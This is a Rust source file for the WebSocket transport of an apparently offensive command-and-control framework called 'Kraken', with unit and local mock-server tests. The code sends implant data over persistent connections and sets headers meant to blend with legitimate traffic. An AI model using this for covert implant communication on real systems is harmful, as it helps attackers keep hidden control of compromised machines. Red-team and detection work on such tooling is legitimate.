//! WebSocket Transport implementation
//!
//! Provides WebSocket (ws:// and wss://) communication using synchronous
//! tungstenite. Follows a request-response pattern matching HTTP exchange
//! semantics: connect, send binary frame, receive binary response, close.
//!
//! For persistent connections, the socket is kept open across exchanges and
//! reconnected automatically on error.

use common::{KrakenError, Transport};
use std::net::TcpStream;
use std::sync::Mutex;
use std::time::Duration;
use tungstenite::{
    client::IntoClientRequest,
    http::HeaderValue,
    protocol::WebSocket,
    stream::MaybeTlsStream,
    Message,
};
use tracing::{debug, warn};

/// State of the persistent WebSocket connection
enum ConnectionState {
    Disconnected,
    Connected(WebSocket<MaybeTlsStream<TcpStream>>),
}

/// WebSocket Transport for C2 communication
///
/// Uses a persistent WebSocket connection with automatic reconnection.
/// Sends implant data as Binary WebSocket frames and expects a Binary response.
pub struct WebSocketTransport {
    /// WebSocket endpoint URL (ws:// or wss://)
    url: String,
    /// Additional headers to send during handshake (for blending)
    headers: Vec<(String, String)>,
    /// Whether this transport is considered available
    available: bool,
    /// Persistent connection (interior mutability for the synchronous trait)
    connection: Mutex<ConnectionState>,
    /// Connection timeout in seconds
    connect_timeout_secs: u64,
}

#[allow(dead_code)]
impl WebSocketTransport {
    /// Create a new WebSocket transport pointing at `url`
    ///
    /// Accepts both `ws://` and `wss://` schemes.
    pub fn new(url: &str) -> Self {
        Self {
            url: url.to_string(),
            headers: Vec::new(),
            available: true,
            connection: Mutex::new(ConnectionState::Disconnected),
            connect_timeout_secs: 30,
        }
    }

    /// Attach an extra HTTP upgrade header (builder pattern)
    ///
    /// Useful for setting `Origin`, `User-Agent`, or custom jitter headers
    /// that help the connection blend with legitimate WebSocket traffic.
    pub fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.push((key.to_string(), value.to_string()));
        self
    }

    /// Override the default 30-second connection timeout
    pub fn with_timeout(mut self, secs: u64) -> Self {
        self.connect_timeout_secs = secs;
        self
    }

    /// Build a new WebSocket connection to `self.url` applying all custom headers.
    fn connect(&self) -> Result<WebSocket<MaybeTlsStream<TcpStream>>, KrakenError> {
        debug!(url = %self.url, "connecting WebSocket");

        let mut request = self
            .url
            .as_str()
            .into_client_request()
            .map_err(|e| KrakenError::transport(format!("invalid WebSocket URL: {}", e)))?;

        // Inject custom headers into the upgrade request
        for (key, value) in &self.headers {
            let hv = HeaderValue::from_str(value)
                .map_err(|e| KrakenError::transport(format!("invalid header value: {}", e)))?;
            request.headers_mut().insert(
                key.parse::<tungstenite::http::header::HeaderName>()
                    .map_err(|e| KrakenError::transport(format!("invalid header name: {}", e)))?,
                hv,
            );
        }

        // Resolve host:port from the URL for TCP connect
        let host_port = extract_host_port(&self.url)?;

        // Establish TCP stream with a timeout
        let tcp = TcpStream::connect(&host_port)
            .map_err(|e| KrakenError::transport(format!("TCP connect failed: {}", e)))?;

        tcp.set_read_timeout(Some(Duration::from_secs(self.connect_timeout_secs)))
            .ok();
        tcp.set_write_timeout(Some(Duration::from_secs(self.connect_timeout_secs)))
            .ok();

        let (ws, response) = tungstenite::client_tls(request, tcp)
            .map_err(|e| KrakenError::transport(format!("WebSocket handshake failed: {}", e)))?;

        debug!(status = %response.status(), "WebSocket handshake complete");
        Ok(ws)
    }

    /// Core exchange: get-or-create a connection, send data, receive response.
    ///
    /// On any socket error the connection is dropped and a reconnect is
    /// attempted once before propagating the error.
    fn do_exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        let mut guard = self
            .connection
            .lock()
            .map_err(|_| KrakenError::transport("connection mutex poisoned"))?;

        // Ensure we have an open connection (lazy connect + reconnect on error)
        if matches!(*guard, ConnectionState::Disconnected) {
            *guard = ConnectionState::Connected(self.connect()?);
        }

        // Attempt the exchange; on failure reconnect once and retry
        match Self::ws_exchange(guard.as_ws_mut().unwrap(), data) {
            Ok(response) => Ok(response),
            Err(e) => {
                warn!(error = %e, "WebSocket exchange failed, reconnecting");
                // Drop the old socket
                *guard = ConnectionState::Disconnected;

                // Reconnect
                let mut ws = self.connect()?;
                let response = Self::ws_exchange(&mut ws, data)?;
                *guard = ConnectionState::Connected(ws);
                Ok(response)
            }
        }
    }

    /// Send `data` as a Binary frame and wait for the first Binary/Text response,
    /// transparently handling Ping/Pong keepalives in between.
    fn ws_exchange(
        ws: &mut WebSocket<MaybeTlsStream<TcpStream>>,
        data: &[u8],
    ) -> Result<Vec<u8>, KrakenError> {
        // Send the payload
        ws.send(Message::Binary(data.to_vec()))
            .map_err(|e| KrakenError::transport(format!("WebSocket send failed: {}", e)))?;

        // Read until we receive a data frame (handle Ping/Pong transparently)
        loop {
            let msg = ws
                .read()
                .map_err(|e| KrakenError::transport(format!("WebSocket read failed: {}", e)))?;

            match msg {
                Message::Binary(bytes) => return Ok(bytes),
                Message::Text(text) => return Ok(text.into_bytes()),
                Message::Ping(payload) => {
                    // tungstenite auto-replies to Pings when using `read()`, but
                    // some configurations may require explicit Pong.
                    ws.send(Message::Pong(payload))
                        .map_err(|e| KrakenError::transport(format!("Pong send failed: {}", e)))?;
                    // continue reading
                }
                Message::Pong(_) => {
                    // Unsolicited Pong – ignore and keep reading
                }
                Message::Close(_) => {
                    return Err(KrakenError::transport("WebSocket closed by server"));
                }
                Message::Frame(_) => {
                    // Raw frame - should not appear in normal flow, ignore
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Helper: extract "host:port" from a ws:// or wss:// URL
// ---------------------------------------------------------------------------

fn extract_host_port(url: &str) -> Result<String, KrakenError> {
    let (default_port, rest) = if let Some(r) = url.strip_prefix("wss://") {
        (443u16, r)
    } else if let Some(r) = url.strip_prefix("ws://") {
        (80u16, r)
    } else {
        return Err(KrakenError::transport(format!(
            "unsupported WebSocket scheme in URL: {}",
            url
        )));
    };

    // rest = "host:port/path" or "host/path"
    let host_port_path = rest;
    let host_port = match host_port_path.find('/') {
        Some(idx) => &host_port_path[..idx],
        None => host_port_path,
    };

    // Already has an explicit port?
    if host_port.contains(':') {
        Ok(host_port.to_string())
    } else {
        Ok(format!("{}:{}", host_port, default_port))
    }
}

// ---------------------------------------------------------------------------
// Convenience extension on ConnectionState
// ---------------------------------------------------------------------------

impl ConnectionState {
    fn as_ws_mut(&mut self) -> Option<&mut WebSocket<MaybeTlsStream<TcpStream>>> {
        match self {
            ConnectionState::Connected(ws) => Some(ws),
            ConnectionState::Disconnected => None,
        }
    }
}

// ---------------------------------------------------------------------------
// Transport trait implementation
// ---------------------------------------------------------------------------

impl Transport for WebSocketTransport {
    fn id(&self) -> &'static str {
        "websocket"
    }

    fn exchange(&self, data: &[u8]) -> Result<Vec<u8>, KrakenError> {
        self.do_exchange(data)
    }

    fn is_available(&self) -> bool {
        self.available
    }

    fn reset(&mut self) {
        self.available = true;
        // Close any lingering socket so the next exchange reconnects cleanly
        if let Ok(mut guard) = self.connection.lock() {
            if let ConnectionState::Connected(ws) = &mut *guard {
                let _ = ws.close(None);
            }
            *guard = ConnectionState::Disconnected;
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;
    use std::thread;

    // -----------------------------------------------------------------------
    // Unit tests (no network)
    // -----------------------------------------------------------------------

    #[test]
    fn test_new_defaults() {
        let t = WebSocketTransport::new("ws://127.0.0.1:9000/c2");
        assert_eq!(t.url, "ws://127.0.0.1:9000/c2");
        assert!(t.headers.is_empty());
        assert!(t.available);
        assert_eq!(t.connect_timeout_secs, 30);
    }

    #[test]
    fn test_with_header_builder() {
        let t = WebSocketTransport::new("ws://example.com/c2")
            .with_header("User-Agent", "Mozilla/5.0")
            .with_header("Origin", "https://example.com");

        assert_eq!(t.headers.len(), 2);
        assert_eq!(t.headers[0], ("User-Agent".to_string(), "Mozilla/5.0".to_string()));
        assert_eq!(t.headers[1], ("Origin".to_string(), "https://example.com".to_string()));
    }

    #[test]
    fn test_with_timeout_builder() {
        let t = WebSocketTransport::new("ws://example.com/c2").with_timeout(60);
        assert_eq!(t.connect_timeout_secs, 60);
    }

    #[test]
    fn test_is_available_initial() {
        let t = WebSocketTransport::new("ws://127.0.0.1:9001/c2");
        assert!(t.is_available());
    }

    #[test]
    fn test_reset_restores_availability() {
        let mut t = WebSocketTransport::new("ws://127.0.0.1:9002/c2");
        t.available = false;
        t.reset();
        assert!(t.is_available());
    }

    #[test]
    fn test_id() {
        let t = WebSocketTransport::new("ws://127.0.0.1:9003/c2");
        assert_eq!(t.id(), "websocket");
    }

    #[test]
    fn test_extract_host_port_ws_default() {
        assert_eq!(
            extract_host_port("ws://example.com/path").unwrap(),
            "example.com:80"
        );
    }

    #[test]
    fn test_extract_host_port_wss_default() {
        assert_eq!(
            extract_host_port("wss://example.com/path").unwrap(),
            "example.com:443"
        );
    }

    #[test]
    fn test_extract_host_port_explicit() {
        assert_eq!(
            extract_host_port("ws://127.0.0.1:9000/c2").unwrap(),
            "127.0.0.1:9000"
        );
    }

    #[test]
    fn test_extract_host_port_no_path() {
        assert_eq!(
            extract_host_port("wss://example.com").unwrap(),
            "example.com:443"
        );
    }

    #[test]
    fn test_extract_host_port_invalid_scheme() {
        assert!(extract_host_port("http://example.com").is_err());
    }

    // -----------------------------------------------------------------------
    // Integration test: minimal raw WebSocket server
    //
    // Spins up a TCP listener that performs a minimal WebSocket upgrade,
    // reads one Binary frame, echoes it back, and closes.
    // -----------------------------------------------------------------------

    /// Perform a bare-minimum WebSocket server handshake + echo, then close.
    fn run_mock_ws_server(listener: TcpListener, expected_payload: Vec<u8>) {
        thread::spawn(move || {
            if let Ok((stream, _addr)) = listener.accept() {
                // Hand the TCP stream to tungstenite server-side
                let mut ws = tungstenite::accept(stream).expect("WS server accept");

                loop {
                    match ws.read() {
                        Ok(Message::Binary(data)) => {
                            assert_eq!(data, expected_payload, "payload mismatch");
                            // Echo back
                            ws.send(Message::Binary(data)).ok();
                            ws.close(None).ok();
                            break;
                        }
                        Ok(Message::Ping(p)) => {
                            ws.send(Message::Pong(p)).ok();
                        }
                        Ok(Message::Close(_)) | Err(_) => break,
                        _ => {}
                    }
                }
            }
        });
    }

    #[test]
    fn test_exchange_with_mock_server() {
        // Bind on OS-assigned port to avoid conflicts
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let payload = b"hello kraken".to_vec();

        run_mock_ws_server(listener, payload.clone());

        let t = WebSocketTransport::new(&format!("ws://127.0.0.1:{}/c2", port));
        let response = t.exchange(&payload).unwrap();
        assert_eq!(response, payload);
    }

    #[test]
    fn test_exchange_fails_when_no_server() {
        // Port 1 is not normally bindable/listenable – connection will fail
        let t = WebSocketTransport::new("ws://127.0.0.1:1/c2");
        let result = t.exchange(b"data");
        assert!(result.is_err());
    }

    #[test]
    fn test_reset_closes_connection() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let payload = b"test reset".to_vec();

        run_mock_ws_server(listener, payload.clone());

        let mut t = WebSocketTransport::new(&format!("ws://127.0.0.1:{}/c2", port));

        // Make a successful exchange to open the connection
        let _ = t.exchange(&payload);

        // After reset, the internal connection should be Disconnected
        t.reset();
        assert!(t.is_available());
        // Inspect internal state
        let guard = t.connection.lock().unwrap();
        assert!(matches!(*guard, ConnectionState::Disconnected));
    }

    #[test]
    fn test_reconnect_after_server_close() {
        // First server: accepts one exchange then closes
        let l1 = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = l1.local_addr().unwrap().port();
        run_mock_ws_server(l1, b"ping".to_vec());

        let t = WebSocketTransport::new(&format!("ws://127.0.0.1:{}/c2", port));

        // First exchange should succeed
        let r1 = t.exchange(b"ping").unwrap();
        assert_eq!(r1, b"ping");

        // Second exchange on the same transport: server is gone so we
        // expect an error (connection refused / closed).
        let r2 = t.exchange(b"ping2");
        assert!(r2.is_err(), "expected error after server closed");
    }
}
